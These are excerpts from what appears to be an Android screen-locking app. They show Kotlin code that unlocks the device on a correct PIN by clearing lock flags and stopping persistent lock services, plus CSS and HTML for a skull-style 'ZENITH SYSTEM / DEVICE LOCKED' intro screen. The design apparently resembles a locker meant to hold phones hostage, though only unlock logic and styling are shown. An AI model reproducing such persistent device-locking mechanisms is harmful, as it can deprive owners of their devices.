        ...
        fun tryUnlock(pin: String): Boolean {
            ...
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    // ── Set manual_unlock flag di SEMUA prefs ──
                    // 1. Persistent lock prefs (sistem baru)
                    getSharedPreferences(PersistentLockService.PREFS_NAME, android.content.Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean(PersistentLockService.KEY_MANUAL_UNLOCK, true)
                        .putBoolean(PersistentLockService.KEY_LOCK_ACTIVE, false)
                        .apply()

                    // 2. Lock low prefs (legacy)
                    getSharedPreferences("lock_low_prefs", android.content.Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("lock_low_active", false)
                        .apply()

                    // 3. Lock chat v3 prefs (legacy)
                    getSharedPreferences("lock_chat_v3_prefs", android.content.Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("manual_unlock", true)
                        .putBoolean("lock_active", false)
                        .apply()

                    // ── Stop PersistentLockService ──
                    PersistentLockService.unlockAll(applicationContext)

                    // ── Stop LockMonitorService (legacy) ──
                    try {
                        val stopMonitor = Intent(this@LockNewActivity, LockMonitorService::class.java).apply {
                            action = LockMonitorService.ACTION_UNLOCK_SYSTEM
                        }
                        startService(stopMonitor)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "stopMonitor: ${e.message}")
                    }

                    // ── Broadcast unlock DeviceService ──
                    try {
                    ...
                    // ── Broadcast UNLOCK ke semua listener ──
                    sendBroadcast(Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) })
                    sendBroadcast(Intent(ComboLockService.ACTION_HIDE).apply { setPackage(packageName) })
                    sendBroadcast(Intent("com.sync.xxx.LOCKCHAT_UNLOCK_PERMANENT").apply { setPackage(packageName) })
...
:root{
  ...
  --red:#1e90ff;
  --green:#1e90ff;
  --green-dim:rgba(30,144,255,.08);
  --green-brd:rgba(30,144,255,.2);
  --green-glow:rgba(30,144,255,.35);
  --text:#e0f0ff;
  --text2:#4499ff;
  --text3:#1a3a5a;
}
...
body::before{
  content:'';position:fixed;inset:0;
  background:
    radial-gradient(ellipse 80% 50% at 50% -5%,rgba(30,144,255,.14) 0%,transparent 60%),
    radial-gradient(ellipse 50% 40% at 10% 90%,rgba(30,100,200,.06) 0%,transparent 55%),
    radial-gradient(ellipse 50% 35% at 90% 85%,rgba(30,144,255,.05) 0%,transparent 55%);
  pointer-events:none;
  z-index:0;
}
...
@keyframes pulseBlue{
  0%,100%{filter:drop-shadow(0 0 8px #1e90ff) drop-shadow(0 0 24px #1e90ff)}
  50%{filter:drop-shadow(0 0 20px #1e90ff) drop-shadow(0 0 50px #1e90ff)}
}
...
.intro-bar{
  height:100%;width:0%;
  background:linear-gradient(90deg,#1e90ff,#1e90ff,#1e90ff);
  border-radius:2px;
...
<div id="introScreen">
  <div class="intro-skull">
    <svg width="120" height="120" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
      ...
      <defs>
        <linearGradient id="zGradient" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" style="stop-color:#1e90ff;stop-opacity:1">
            <animate attributeName="stop-color" values="#1e90ff;#4db8ff;#1e90ff" dur="2s" repeatCount="indefinite"/>
          </stop>
          <stop offset="100%" style="stop-color:#0066cc;stop-opacity:1">
            <animate attributeName="stop-color" values="#0066cc;#1e90ff;#0066cc" dur="2s" repeatCount="indefinite"/>
          </stop>
        </linearGradient>
        <filter id="glow">
      ...
      <circle cx="50" cy="50" r="45" stroke="url(#zGradient)" stroke-width="2" fill="none" opacity="0.3">
        <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="4s" repeatCount="indefinite"/>
      </circle>
      
      <!-- Z Letter with pulse -->
      <path d="M 30 30 L 70 30 L 30 70 L 70 70" stroke="url(#zGradient)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" fill="none" filter="url(#glow)">
        <animate attributeName="stroke-width" values="8;10;8" dur="1.5s" repeatCount="indefinite"/>
      </path>
      
      <!-- Inner accent lines -->
      <line x1="35" y1="35" x2="65" y2="35" stroke="#1e90ff" stroke-width="2" opacity="0.6">
        <animate attributeName="opacity" values="0.6;1;0.6" dur="1s" repeatCount="indefinite"/>
      </line>
      <line x1="35" y1="65" x2="65" y2="65" stroke="#1e90ff" stroke-width="2" opacity="0.6">
  ...
  <div class="intro-title">
    <span class="line line1">ZENITH SYSTEM</span>
    <span class="line line2">SECURITY PROTOCOL</span>
    <span class="line line3">DEVICE LOCKED</span>
  </div>
